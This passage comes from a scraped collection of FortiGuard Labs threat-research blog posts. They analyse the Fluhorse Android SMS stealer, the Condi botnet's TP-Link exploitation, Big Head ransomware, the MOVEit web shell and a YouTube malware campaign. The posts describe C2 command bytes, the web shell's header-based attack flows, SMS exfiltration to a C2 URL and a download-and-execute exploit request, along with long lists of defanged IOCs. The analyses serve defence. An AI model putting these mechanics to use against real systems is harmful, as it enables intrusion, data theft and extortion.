implementation includes Android sources for MultiDex support). The “main” of the malware is found in the payload (com.dsfdgfd.sdfsdf.MainActivity). It simply loads the Flutter application, as in the unpacked version of May 2023. Our in-depth static analysis of libapp.so revealed everything we needed to know, including the supposed directory structure of the malicious source code. The malicious Dart package is namedsms_fluterand has the following files: The malware uses the DartTelephonypackage. This package is non-malicious and its code is open-source anddocumented. In particular, the package offers the possibility oflistening to incoming SMS in the background. The malware author closely followed the documentation and created the following code (code is my manual re-construction from assembly). onBackgroundMessage(SmsMessage message) async {// malicious tasks}void main() {runApp(MyApp());} The corresponding assembly lines are shown below. For the reverse engineer, finding the address of a given Dart function is difficult. Several researchers usereFlutter, orsimilar techniqueswhere the application is instrumented and then run, causing each address to be dumped. Unfortunately, for malware analysts, this technique has two major drawbacks besides its complex setup: first, you only get the addresses of the functions you visit. Second,you instrument and run a malware, which should be avoided. To obtain the addresses I was looking for, I usedJEB, a reverse-engineering tool that offers some limited (but at least existing) support for Flutter. In particular, it finds the addresses of each referenced method and is usually able to correctly map the name in the assembly code. When it fails (more frequently on ARM32 and ARM64), I fall back to reversing the x86_64 library. Fortunately, the x86_64 version was provided in this Fluhorse sample, probably by error, because the rest of the implementation (for example, the packing) is not implemented for x86_64. If that doesn’t work, then I manually get the address from JEB’s code information and re-base it with the relocation base for zero-based objects. We can see below that the malware listens to incoming SMS. First, it registers for change notifications on SMS and then callslistenIncomingSmsin theTelephonypackage. The malware then posts the incoming SMS message to a remote website in an asynchronous task. Reverse engineering the code reveals several specificities to Dart assembly. In Dart, all constants, literals, etc, are stored in an Object Pool, which is like an index table. Later, all access to strings is done indirectly: the code asks for access to a given index. Dart assembly dedicates a custom registerR15for x86_64 to access the Object Pool. The illustrated example above accesses R15+8FB7, which corresponds to index 0x8FB7 // 8 =4598.JEB shows the Object Pool indexesfor us and lets us map the assembly line by fetching the domain name string. The SMS body is inserted in the URL as argument “c4” (e.g., hxxp://pmm122[.]com/addcontent?c4=hello). Theincoming phone number is not providedbecause the Telephony package does not provide this feature. In thefollowing code of the (non-malicious) Telephony package, see that only the SMS body is retrieved and provided to the callback. try {await handlerFunction(SmsMessage.fromMap(call.arguments['message'], INCOMING_SMS_COLUMNS));} catch (e) { Later, Fluhorse’s code performs the HTTP POST of the SMS message and reads the response. This is handled byDart’s standard HTTP package. Reversing Flutter applications statically is a breakthrough for anti-virus researchers, as, unfortunately, more malicious Flutter apps are expected to be released in the future. Building expertise in dealing with these samples and improving tools is necessary. This blog post provides results for Android/Fluhorse. More detailed explanations have been submitted to conferences in Q4 2023, where I hope to be selected to explain this live. ;) Stay tuned! Fortinet customers are fully protected against this family of malware. Samples in this blog are detected by the FortiGuard AV engine as: Android/Fluhorse.A!tr.spy Android/Packed.57103!tr. The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. Fortinet Webfiltering blocks all URLs identified in this blog. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. The samples mentioned in this blog post are (sha256 hash): 2c05efa757744cb01346fe6b39e9ef8ea2582d27481a441eb885c5c4dcd2b65b Other similar samples: e8cdf809a5655124fa9347e7a90f071bed74907d3098737fd1184148ab475e396e7293564e7e2e051d42168b068535a7963974cdd6437a3242230b9593dc7f047cee6677790c493dddf16ff610a174e6536208f8853816cd0d71fc6bde56e93c91f0a27ae5ca77930c21b19f33479e7abcb10dfcf2a92b690ccddea01434fe847dff0f7987f956c948847ea3659730408e35e4513b6adcd92d60ba48a93f62f16f0b3733f91a6af56bf5bc789b808475cb556f2d360131ef6a9082b98dfd01390a577ee60ca676e49add6f266a1ee8ba5434290fa8954cc35f8754604600838825fee29a8cb3e6b71771897e34a58cf9c7c0be4805acabb36be886e93de03f62663033dce1688186d6111c8637dd3bc79483bdb8fc1b2ad4d5ead030f79f84b76dbde61a3aa372e8af7aa049dd466a2892bbe0d1229866cb2ba46c8f61648a5794bb98d9955947f9e7c502961e4b2a7724289e80b566035c14ac9fa6cf36df1c852314984cbea056a782520654f84c828588b6a0163bdeb8f8d5016b05c205f9c55feac16e7ca084f47a899281b566faf41b5666376353efeb9010fe5d23b5260a106c851a267fb8590be1f033e995bfc559ffaf2be050b3f12f599e0c8c021c32c427581a0368b66dd50b381772fb0d6dab30d8316f4e4f0d0373d453091cd07909593a310b245a1a92a78469be341b0849e6f1076af30f8266b1c5a861ead1c25d533487499204771fac87787d38df91f0971b693dffa9b17fa0d92c80bfac5af2ec81d09ecbf8c26a8887d96c948b3c61667b7ffc488fbd67239ea9ac2cd65481348e4751a494bc76ab4908071124f12624369401b717c7766e7d0645754d android malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/fortinet-reverses-flutter-based-android-malware-fluhorse"
  },
  {
    "title": "Condi DDoS Botnet Spreads via TP-Link's CVE-2023-1389",
    "content": "FortiGuard Labs Threat Research Affected platforms:LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity level:Critical FortiGuard Labs encountered recent samples of aDDoS-as-a-service botnet calling itself Condi. It attempted to spread by exploiting TP-Link Archer AX21 (AX1800) routers vulnerable toCVE-2023-1389, which was disclosed in mid-March of this year. We have additionally observed an increasing number of Condi samples collected from our monitoring systems since the end of May 2023, indicating an active attempt to expand the botnet. This blog details the capabilities of this botnet. While pivoting from the Command and Control (C2) domain cdn2[.]duc3k[.]com in one of the malware samples, FortiGuard Labs researchers found a sibling domain admin[.]duc3k[.]com that previously displayed the message \"contact @zxcr9999 telegram”. A quick search revealed a Telegram channel, Condi Network, advertising a Condi botnet with capabilities matching those observed in our sample (Figure 1). The Telegram channel was started in May 2022, and the threat actor has been monetizing its botnet by providing DDoS-as-a-service and selling the malware source code (Figure 2). We provide a technical analysis of the ARM malware sample509f5bb6bcc0f2da762847364f7c433d1179fb2b2f4828eefb30828c485a3084in the following sections: This malware employs several techniques to keep itself running in an infected system. At the same time, it also prevents infections from other botnets by attempting to terminate their processes. Typical to Mirai-based botnets, this malware cannot survive a system reboot. Because of this, it deletes the following binaries used to shut down or reboot the system. It also reads the /proc/<PID>/status for each running process and compares the Name field to the following strings to kill any processes with matching names: We assess that the developer intended to kill off older versions of Condi currently running on an infected device together with selected system processes. However, the implementation is flawed as the Name field only contains the executable names of processes and not their full paths. Additionally, it kills any processes with binary filenames containing the following extensions commonly used by other botnets: It also generates a random string of at least ten characters from the custom alphanumeric character set \"lvrvup9w0zwi6nuqf0kilumln8ox5vgv@\" and attempts to kill any process with this string in its command line, however it is near certain this process will not exist. Which process the malware developer intended to terminate with this code is unclear. Finally, it generates two numbers (one between 12 and 32, the other between 12 and 20) and kills any processes with a command line length matching either number. Killing off random processes based on their command line length is likely to wreak havoc and prevent the infected device from functioning correctly if the malware happens to terminate system processes. Unlike most DDoS botnets, this sample does not propagate by trying different credentials. Instead, it embeds a simple scanner modified from Mirai’s original Telnet scanner to scan for any public IPs with open ports 80 or 8080 (commonly used for HTTP servers) and then sends a hardcoded exploitation request (Figure 3) to download and execute a remote shell script at hxxp://cdn2[.]duc3k[.]com/t, which will infect the device with Condi if it is a vulnerable TP-Link Archer AX21 device. The remote shell script is typical of Mirai-based loaders that try to download and execute binaries of each architecture in turn (Figure 4). The first command-line argument provided to the malware binary, ”0days”, in this case, is referred to as “id” (“source” in the original Mirai code), which DDoS botnet operators commonly use to identify the method used to replicate the malware. While the sample we analyzed only contained the scanner for CVE-2023-1389, other Condi botnet samples were also seen exploiting other vulnerabilities to propagate. The publicly available source code for older versions also includes scanners for known vulnerabilities exploited by other Mirai variants. We also observed shell scripts hosted on the same IP with different sources in the execution commands. Figure 5 shows a script with an “adb” source, which refers to Android Debug Bridge (ADB). We found source code for an older version of Condi that scans for devices withan open Android Debug Bridge port(TCP/5555), so it is possible that the botnet is currently being propagated via this means. The binary protocol used by Condi to communicate with the C2 server is a modified version of that initially implemented in Mirai. The initial registration packet sent by the bot to the C2 contains the bytes\\x33\\x66\\x99, commonly associated with Moobot, another Mirai variant. These bytes are followed by a one-byte length of the “id”. In the case of Condi, \"id” defaults to “c” if none was specified, or in our case, of an infection via CVE-2023-1389, “0days”. This signals the C2 server that the malware is ready to receive commands. The first three bytes of the C2 response indicate the command for the Condi bot: 1.\\x99\\x66\\x33: Likely to check if the malware is still active, in which case the malware sends a packet to C2 with \\x66\\x99\\x66\\x04 followed by “ping” 2.\\x99\\x66\\x66: Terminate the bot 3.\\x33\\x66\\x66: Start the webserver for serving malware binaries 4.\\x33\\x66\\x33: Update binaries served by the webserver 5.\\x33\\x66\\x99: Send the webserver port. Malware responds with \\x66\\x99\\x66 followed by a length of the next string and “CondiiNeett webserv:<PORT>\" 6.\\x66\\x66\\x99: Sets an unusedlockdownflag, which might indicate a feature in development. Once it receives the\\x33\\x66\\x66command used to start the webserver, this malware downloads bot binaries from a hardcoded IP and port. After that, it starts a basic HTTP server on a random port number above 1024 to host these binaries. GET, POST, and HEAD requests to this server for the/arm,/arm7,/mips,/mipsel,/x86_64,/sh4,/ppc, and/m68kURLs will serve these binaries if they were downloaded previously. This HTTP server masquerades as a legitimate Apache HTTP server by responding with the “Server: Apache” header when any URLs are requested. From then on, the threat actor can issue the\\x33\\x66\\x33command to download the latest binaries from the same hardcoded IP and port so that the webserver serves the most updated version of the malware. If the first byte of the C2 response is not\\x33,\\x66, or\\x99, the bot parses it as an attack command in the same way as Mirai. Below is this sample's list of attack functions and a description of the implemented attack method. As the attack methods are consistent with the descriptions in the Telegram advertisement (Figure 1), this particular sample was likely built by the bot developer or someone with access to the malware source code. This sample did not contain any HTTP attack methods observed in older Condi versions. Malware campaigns, especially botnets, are always looking for ways to expand. Exploiting recently discovered (or published) vulnerabilities has always been one of their favored methods, as we highlighted above for the Condi botnet. Thus, it is strongly recommended to always apply the latest security patches and updates as soon as possible. As always, FortiGuard Labs will continue to monitor these campaigns. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog: The FortiGuard AntiVirus service is supported by FortiGate, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. The FortiGuard Web Filtering Service blocks the C2 servers and download URLs. FortiGuard Labs provides IPS signatures against attacks exploiting the following vulnerability: For a comprehensive list of protections from FortiGuard Labs for this vulnerability, please visit theOutbreak Alertpage for further details. TheFortiGuard IP Reputation and Anti-Botnet Security Serviceproactively blocks these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 091d1aca4fcd399102610265a57f5a6016f06b1947f86382a2bf2a668912554f291e6383284d38f958fb90d56780536b03bcc321f1177713d3834495f64a3144449ad6e25b703b85fb0849a234cbb62770653e6518cf1584a94a52cca31b11904e3fa5fa2dcc6328c71fed84c9d18dfdbd34f8688c6bee1526fd22ee1d749e5a509f5bb6bcc0f2da762847364f7c433d1179fb2b2f4828eefb30828c485a3084593e75b5809591469dbf57a7f76f93cb256471d89267c3800f855cabefe493155e841db73f5faefe97e38c131433689cb2df6f024466081f26c07c4901fdf612cbff9c7b5eea051188cfd0c47bd7f5fe51983fba0b237f400522f22ab91d2772ccda8a68a412eb1bc468e82dda12eb9a7c9d186fabf0bbdc3f24cd0fb20458cce7a4aae413d4742d9c0e25066997153b844789a1409fd0aecce8cc6868729a15f7fb5f3dc06aebcb56f7a9550b005c2c4fc6b2e2a50430d64389914f882d67cf hxxp://85[.]217[.]144[.]35/armhxxp://85[.]217[.]144[.]35/arm5hxxp://85[.]217[.]144[.]35/arm6hxxp://85[.]217[.]144[.]35/arm7hxxp://85[.]217[.]144[.]35/m68khxxp://85[.]217[.]144[.]35/mipshxxp://85[.]217[.]144[.]35/mpslhxxp://85[.]217[.]144[.]35/ppchxxp://85[.]217[.]144[.]35/sh4hxxp://85[.]217[.]144[.]35/x86hxxp://85[.]217[.]144[.]35/x86_64hxxp://85[.]217[.]144[.]35/abc3.shhxxp://cdn2[.]duc3k[.]com/t 85[.]217[.]144[.]35cdn2[.]duc3k[.]com botnet,DDoS attacks FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/condi-ddos-botnet-spreads-via-tp-links-cve-2023-1389"
  },
  {
    "title": "Ransomware Roundup - Big Head",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs came across two new ransomware variants, “Big Head” and another likely used by the same attacker, targeting consumers to extort money. On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Big Head ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High FortiGuard Labs recently came across a new ransomware variant called Big Head, which came out in May 2023. Although there are at least three variants of Big Head ransomware, all are designed to encrypt files on victims’ machines to extort money, like other ransomware variants. One Big Head ransomware variant displays a fake Windows Update, potentially indicating that the ransomware was also distributed as a fake Windows Update. One of the variants has a Microsoft Word icon and was likely distributed as counterfeit software. At the time of this research, there is no indication that Big Head is widespread. FortiGuard Labs is aware of at least two variants of Big Head ransomware, which we have named variants A and B. Variant A Once Big Head ransomware variant A is executed, it displays a fake Windows Update screen to trick users into believing that legitimate actions are occurring behind the scenes. The fake Windows Update lasts about 30 seconds and automatically closes. By the time the phony update is done, the ransomware has already encrypted files on compromised machines with file names randomly altered. The ransomware then opens a ransom note labeled “README_[random seven digits number] that demands victims contact the attacker via email or telegram for file decryption and data leak. Big Head ransomware variant A has also been seen to leave a slightly different version of the ransom note, including the attacker’s Bitcoin address for “immediate ransom payment.” Variant B While the Big Head ransomware variant B did not encrypt any files in our test environment, it is designed to encrypt files on compromised machines. Our analysis found that variant B uses a PowerShell file named “cry.ps1” for file encryption. The variant B does not drop cry.ps1 in some cases, and file encryption does not occur. However, it does not stop variant B from replacing the Desktop wallpaper with its own containing ransom note. Like variant A, the ransom note requests that victims contact the attacker using the same email address or telegram channel. The difference is that a  ransom fee of one Bitcoin is included in the variant B ransom note. The relatively low ransom fee indicates that Big Head ransomware is used to target consumers rather than enterprises. Variant B separately drops a ransom note labeled “Read Me First!/txt” with the same ransom message as the wallpaper. Variant B also tries to open the attacker’s Github page on a default Web browser; however, the page is unavailable because it has been removed or shut down. The attacker’s Bitcoin wallet recorded two transactions: one in December 2022 for $313.93, the other in August of the same year for $70.07. Since the Big Head ransomware came out in May 2023, those transactions do not appear to be related to the ransomware variant. Ransomware of the Same Stripe FortiGuard Labs found another ransomware variant that, based on the Bitcoin wallet and email address, was likely used by the same attacker. This ransomware was also submitted to a publicly available file scanning service in May 2023, the same month the Big Head ransomware variants were made available. This ransomware variant encrypts files and appends the attacker’s contact email address, “poop69new@[redacted],” to the file names. It also replaces the desktop wallpaper with its own that includes the following ransom note. It also leaves an alternative ransom note labeled “read_it.txt”. Most of the Big Head ransomware samples were submitted from the United States. Another ransomware used by the same attacker was submitted from the United States, Spain, France, and Turkey. Fortinet customers are already protected from this malware variant through AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Big Head ransomware variants with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. File-based IOCs: SHA256 Malware 2a36d1be9330a77f0bc0f7fdc0e903ddd99fcee0b9c93cb69d2f0773f0afd254 Big Head ransomware 39caec2f2e9fda6e6a7ce8f22e29e1c77c8f1b4bde80c91f6f78cc819f031756 40e5050b894cb70c93260645bf9804f50580050eb131e24f30cb91eec9ad1a6e 64246b9455d76a094376b04a2584d16771cd6164db72287492078719a0c749ab 6d27c1b457a34ce9edfb4060d9e04eb44d021a7b03223ee72ca569c8c4215438 9c1c527a826d16419009a1b7797ed20990b9a04344da9c32deea00378a6eeee2 ae927feae84239c7f56a2c49aadb02dc318ef4be2860353b6a2428bdbbf0ae71 bcf8464d042171d7ecaada848b5403b6a810a91f7fd8f298b611e94fa7250463 dcfa0fca8c1dd710b4f40784d286c39e5d07b87700bdc87a48659c0426ec6cb6 1942aac761bc2e21cf303e987ef2a7740a33c388af28ba57787f10b1804ea38e Another ransomware used by the same attacker f59c45b71eb62326d74e83a87f821603bf277465863bfc9c1dcb38a97b0b359d Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is generally delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Roundup,ransomware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/fortiguard-labs-ransomware-roundup-big-head"
  },
  {
    "title": "MOVEit Transfer Critical Vulnerability (CVE-2023-34362) Exploited as a 0-day",
    "content": "FortiGuard Labs Threat Research Affected Platforms:All unpatched MOVEit Transfer versions running a SQL databaseImpacted Users:Any organization that uses a vulnerable version of MOVEit TransferImpact:Remote attackers can install a backdoor and exfiltrate dataSeverity Level:High FortiGuard Labs is aware of a critical zero-day SQL injection vulnerability in the MOVEit Secure Managed File Transfer software (CVE-2023-34362) allegedly exploited by the Cl0p ransomware threat actor. High-profile government, finance, media, aviation, and healthcare organizations have reportedly been affected, with data exfiltrated and stolen. Due to its severity, CISA released anadvisoryfor the vulnerability on June 1st, 2023. They also updated theKnown Exploited Vulnerabilitiescatalog on June 2ndwith CVE-2023-34362. This blog contains information on what you need to know about CVE-2023-34362. For further details, please see the relatedFortiGuard Labs Outbreak Alert. MOVEit Transfer is a commercial secure managed file transfer (MFT) software solution that enables the secure movement of files between organizations and their customers using SFTP, SCP, and HTTP-based uploads. MOVEit Transfer is vulnerable to a SQL injection vulnerability that could allow an unauthenticated attacker to access MOVEit Transfer's database.  Structured Query Language (SQL) allows queries and commands to be executed against a relational database. An injection vulnerability allows an attacker to manipulate one of these queries to exploit a system to retrieve data or make changes. In this case, an attacker could pull data from the database that would otherwise be secured, execute their own SQL queries, and change and delete data. This vulnerability affects versions of MOVEit before 2021.0.6 (13.0.6), 2021.1.4 (13.1.4), 2022.0.4 (14.0.4), 2022.1.5 (14.1.5), and 2023.0.1 (15.0.1) as well as versions using the following engines to host the actual database: MySQL [open-source relational database management system], Microsoft SQL Server [Microsoft on-premises relational database management system], and Azure SQL [Microsoft cloud-based relational database management system]). Reportedly, a web shell that acts as a backdoor was deployed, and data exfiltration was performed after successfully exploiting the vulnerability. However, as described in the next section, attackers can deploy any file after exploitation. At the time of this writing, a CVSS score still needs to be assigned for the vulnerability. Our investigation on a web shell backdoor likely installed after CVE-2023-34362 was successfully exploited revealed that all commands to the backdoor are sent through extra HTTP request headers. A password is needed to verify the attacker and allow access to the backdoor. This is sent with the \"X-siLock-Comment\" header. If the password is invalid, the backdoor will respond with a 404 HTTP status code to pretend the backdoor doesn't exist. We also discovered that the web shell has the following attack flows: 1.     Delete the service account. The HTTP request headers should include the following: If \"-2\" is sent with an \"X-siLock-Step1\" header, the backdoor deletes any users from the \"user\" table in the database that has the actual name of \"Health Check Service.\" 2.     List database files. The HTTP request headers should include the following: If \"-1\" is sent with an \"X-siLock-Step1\" header, the backdoor list files in the database. The file listing also includes file metadata. It tries to include the file's id, name, and size. It also tries to display the file's location (folder path) and which user owns/uploaded the file. The listing also tries to include which institution the file is associated with. 3.     Create a new service account. The HTTP request headers should include the following: If an integer is sent with an \"X-siLock-Step1\" header, and it isn't \"-1\" or \"-2\", the backdoor assumes it is an institution id. Institution ids can be enumerated from step 2 in the attack flow when the database files are listed. The attacker is trying to create a new service account for a specific institution. To ensure step 1 in the attack flow was successful, this command first looks for users with an active session and a permission level of \"30\" belonging to the institution. If no account with the real name of “Health Check Service” exists, the backdoor creates a new username containing 16 random alphanumeric characters. It inserts that as the new Health Check Service account for the specified institution. It then tries to add that to the list of currently active sessions using the IP address 127.0.0.1 since the service account is supposed to be local. 4.     Download arbitrary files. The HTTP request headers should include the following: If an institution id, folder id, and file id are all included, it attempts to download the file. These values can be obtained from step 2 in the overall attack flow. While we do not know precisely how many organizations were impacted by this vulnerability, publicly available information indicates that several high-profile organizations have been compromised. The web shell backdoor, likely deployed due to the successful exploitation of CVE-2023-34362, was submitted to a public file scanning service from the United States, the United Kingdom, Germany, Italy, India, and Pakistan. As such, potential victims could likely be located in those countries. The vendor released an advisory on May 31st, 2023, along with the timeline: The advisory contains Indicators of Compromise (IOCs) that can help cybersecurity professionals identify attacks leveraging CVE-2023-34462. Yes. A vendor patch was released on May 31st, 2023. FortiGuard Labs has the following AV signature available for the available web shell backdoor samples reportedly deployed after CVE-2023-34362 was exploited: FortiGuard Labs released the following IPS signature for CVE-2023-34362 in version 23.570: Webfiltering blocks Network IOCs listed on the security advisory issued by Progress. For a comprehensive list of protections from FortiGuard Labs, please visit theOutbreak Alert pagefor further details. Yes,the vendor advisorycontains mitigation that can be applied before applying the vendor patch. CVE-2023-34362 has allegedly been leveraged by the Cl0p ransomware threat actor to compromise multiple organizations for data exfiltration and other malicious activities. Now that the vulnerability has gained public attention, we expect other threat actors to also leverage this vulnerability, and new attempts at exploitation will likely be accelerated. As such, FortiGuard Labs strongly urges MOVEit Transfer users to apply all patches and implement mitigations provided by the vendor as soon as possible. FortiGuard Labs will continue to actively monitor the situation for further insights and provide additional information about protections as they become available. File IOCs SHA2 Malware 702421bcee1785d93271d311f0203da34cc936317e299575b06503945a6ea1e0 web shell backdoor 929bf317a41b187cf17f6958c5364f9c5352003edca78a75ee33b43894876c62 web shell backdoor c77438e8657518221613fbce451c664a75f05beea2184a3ae67f30ea71d34f37 web shell backdoor 93137272f3654d56b9ce63bec2e40dd816c82fb6bad9985bed477f17999a47db web shell backdoor bdd4fa8e97e5e6eaaac8d6178f1cf4c324b9c59fc276fd6b368e811b327ccf8b web shell backdoor d49cf23d83b2743c573ba383bf6f3c28da41ac5f745cde41ef8cd1344528c195 web shell backdoor 348e435196dd795e1ec31169bd111c7ec964e5a6ab525a562b17f10de0ab031d web shell backdoor 769f77aace5eed4717c7d3142989b53bd5bac9297a6e11b2c588c3989b397e6b web shell backdoor 7c39499dd3b0b283b242f7b7996205a9b3cf8bd5c943ef6766992204d46ec5f1 web shell backdoor 3a977446ed70b02864ef8cfa3135d8b134c93ef868a4cc0aa5d3c2a74545725b web shell backdoor b9a0baf82feb08e42fa6ca53e9ec379e79fbe8362a7dac6150eb39c2d33d94ad web shell backdoor 4359aead416b1b2df8ad9e53c497806403a2253b7e13c03317fc08ad3b0b95bf web shell backdoor daaa102d82550f97642887514093c98ccd51735e025995c2cc14718330a856f4 web shell backdoor a1269294254e958e0e58fc0fe887ebbc4201d5c266557f09c3f37542bd6d53d7 web shell backdoor f0d85b65b9f6942c75271209138ab24a73da29a06bc6cc4faeddcb825058c09d web shell backdoor ea433739fb708f5d25c937925e499c8d2228bf245653ee89a6f3d26a5fd00b7a web shell backdoor cf23ea0d63b4c4c348865cefd70c35727ea8c82ba86d56635e488d816e60ea45 web shell backdoor 5b566de1aa4b2f79f579cdac6283b33e98fdc8c1cfa6211a787f8156848d67ff web shell backdoor 0ea05169d111415903a1098110c34cdbbd390c23016cd4e179dd9ef507104495 web shell backdoor 387cee566aedbafa8c114ed1c6b98d8b9b65e9f178cf2f6ae2f5ac441082747a web shell backdoor 3ab73ea9aebf271e5f3ed701286701d0be688bf7ad4fb276cb4fbe35c8af8409 web shell backdoor c56bcb513248885673645ff1df44d3661a75cfacdce485535da898aa9ba320d4 web shell backdoor fe5f8388ccea7c548d587d1e2843921c038a9f4ddad3cb03f3aa8a45c29c6a2f web shell backdoor 9d1723777de67bc7e11678db800d2a32de3bcd6c40a629cd165e3f7bbace8ead web shell backdoor 9e89d9f045664996067a05610ea2b0ad4f7f502f73d84321fb07861348fdc24a web shell backdoor b1c299a9fe6076f370178de7b808f36135df16c4e438ef6453a39565ff2ec272 web shell backdoor 6015fed13c5510bbb89b0a5302c8b95a5b811982ff6de9930725c4630ec4011d web shell backdoor 48367d94ccb4411f15d7ef9c455c92125f3ad812f2363c4d2e949ce1b615429a web shell backdoor 2413b5d0750c23b07999ec33a5b4930be224b661aaf290a0118db803f31acbc5 web shell backdoor e8012a15b6f6b404a33f293205b602ece486d01337b8b3ec331cd99ccadb562e web shell backdoor d477ec94e522b8d741f46b2c00291da05c72d21c359244ccb1c211c12b635899 web shell backdoor 3c0dbda8a5500367c22ca224919bfc87d725d890756222c8066933286f26494c web shell backdoor Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio.Sign upto receive our threat research blogs. vulnerabilities,zero-day vulnerability FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/moveit-transfer-critical-vulnerability-cve-2023-34362-exploited-as-a-0-day"
  },
  {
    "title": "YouTube Pirated Software Videos Deliver Triple Threat: Vidar Stealer, Laplas Clipper, XMRig Miner",
    "content": "FortiGuard Labs Threat Research Affected Platforms:WindowsImpacted Users:Any organizationImpact:Remote attackers steal credentials, sensitive information, and cryptocurrency and perform cryptojacking on systemsSeverity Level:Critical FortiGuard Labs came across an ongoing threat campaign targeting YouTube viewers searching for pirated software earlier this month. Videos advertising downloads of “cracked” (aka pirated) software are uploaded by verified YouTube channels with a large number of subscribers. Victims are led to execute malicious binaries that install multiple malware into their systems focused on harvesting credentials, cryptojacking, and stealing cryptocurrency funds from wallets. While investigating this campaign,other researcherspublished a report about it. And although there are overlaps with our findings, this report provides additional observations, such as the deployment of a third malware family being distributed to the victims. This article describes the entire attack chain and technical details on the malware components that make up this campaign. The uploaded videos lure users searching for pirated software by using titles such as “Adobe Acrobat Pro dc Crack 2023 free full version / Adobe Acrobat Free Download”. Some videos display tutorials for using the pirated software, although in most cases, they simply display static images often unrelated to the software product (Figure 1). For more credibility, the malware campaign utilizes verified YouTube channels withlarge numbers of followers. In fact, one of the YouTube channels observed hasnearly 3 million subscribers (Figure 2). As these YouTube channels have uploaded legitimate videos in the past, we suspect these accounts may have been compromised. Similar comments (likely auto-generated) were posted for some of the videos, which suggests the possibility of an automated video uploading and commenting process (Figure 3). Potential victims are led to download a password-protected archive from a file-sharing service. The malicious URLs and passwords (usually four numeric digits) are located in the video’s description and the comments section (Figure 4). The videos seem to be uploaded in batches. For instance, one of the accounts uploaded over 50 videos within eight hours, offering different pirated software that all led to the same URL. The videos are deleted after some time, after which the threat actors upload the videos to other accounts. As shown in Figure 5, after downloading the RAR archive2O23-F1LES-S0ft.rarvia the URL provided in the YouTube video description, the victim must uncompress the archive with the password “1212,” listed together with the URL, and run theLauncher_S0FT-2O23.execontained within. The archive also contains multiple unused files and directories, possibly to masquerade as a legitimate installer. A detailed analysis of each component is provided in the following sections. Launcher_S0FT-2O23.exeis the Vidar infostealer. It is appended with over 1GB of unused bytes, a technique commonly used to bypass antivirus and sandboxes that do not scan files beyond a specific size due to limited CPU and RAM resources. The SHA256 hash of this file is820bbfc1f5023af60a7048a0c25e3db51b481afd6986bf1b5ff806cf604c1f4c(original) ande256b5ef66c4e56dac32934594b41e7e8cf432f834046e1c24c0827b120e6ddb(after removing excess bytes). Once executed, it sends an HTTP GET request to its Command and Control (C2) server at 79.137.206[.]228 to check in and retrieve the stealer configuration (Figure 6). Note the 